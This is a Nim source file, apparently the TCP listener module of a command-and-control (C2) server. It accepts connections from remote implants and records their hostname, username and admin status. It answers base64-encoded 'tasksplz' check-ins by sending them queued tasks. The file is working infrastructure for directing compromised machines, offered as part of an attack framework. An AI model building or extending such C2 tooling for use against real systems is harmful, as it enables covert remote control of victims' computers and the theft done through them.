import asyncdispatch, asyncnet, asyncfutures, strutils, json, base64, times

import ../types, ../logging, ../processMessage, ../events

proc processMessages(server: C2Server, tcpSocket: TCPSocket, client: ref C2Client) {.async.} =
  
  var msgS: string = ""
  var linesRecv: int = 0

  while client.connected:
    let line = await tcpSocket.socket.recvLine(maxLength=1000000)

    if line.len == 0:
      client.connected = false
      tcpSocket.socket.close()
      cDisconnected(client[], "client died")
      onClientDisconnected(client[])
      continue

    inc linesRecv
    # if linesRecv == 3:
    #   client.connected = false
    #   tcpSocket.socket.close()
    #   cDisconnected(client[], "too much data sent")
    #   for task in server.tasks:
    #     if task.client == client[]:
    #       task.markAsCompleted(%*{ "error": "client sent too much data" })
    #   continue

    msgS &= line

    var response: JsonNode
    try:
      response = parseJson(decode(msgS))
    except JsonParsingError: 
      if msgS == "tasksplz":
        client.lastCheckin = now()
        msgS = ""
        linesRecv = 0
        var j: JsonNode = %*[]
        for task in client.server.tasks:
          if task.client == client[] and task.status == TaskCreated:
            task.status = TaskNotCompleted
            j.add %*{
              "task": task.action,
              "taskId": task.id,
              "data": task.arguments
            }
        onClientCheckin(client[])  
        await tcpSocket.socket.send(encode($j) & "\r\n")
      continue

    msgS = ""
    linesRecv = 0 

    discard processMessage(client, response)

proc createNewTcpListener*(server: C2Server, port = 12345, ip = "127.0.0.1") {.async.} =
  let id = len(server.tcpListeners)
  
  let tcpServer = TCPListener(
      sockets: @[], 
      port: port,
      listeningIP: ip,
      id: id, 
      socket: newAsyncSocket(),
      running: true
    )
  try:
    tcpServer.socket.setSockOpt(OptReuseAddr, true)
    tcpServer.socket.bindAddr(port.Port, ip)
    tcpServer.socket.listen()
  except OSError:
    errorLog getCurrentExceptionMsg()
    return
  
  server.tcpListeners.add(tcpServer)
  infoLog "listening on " & tcpServer.listeningIP & ":" & $tcpServer.port & " using a tcp socket"
  
  while tcpServer.running:
    let 
      (netAddr, clientSocket) = await tcpServer.socket.acceptAddr()
      client = C2Client(
        id: server.clients.len,
        connected: true,
        loaded: false,
        isAdmin: false,
        hostname: "placeholder",
        username: "placeholder",
        server: server,
        ipAddress: netAddr
      )
      tcpSocket = TCPSocket(
        socket: clientSocket,
        id: client.id,
        netAddr: netAddr,
        tcpListener: tcpServer
      )

    var cRef = new(ref C2Client)
    cRef[] = client

    server.clients.add(client)
    tcpServer.sockets.add(tcpSocket)

    asyncCheck processMessages(server, tcpSocket, cRef)

  infoLog $tcpServer & " stopped"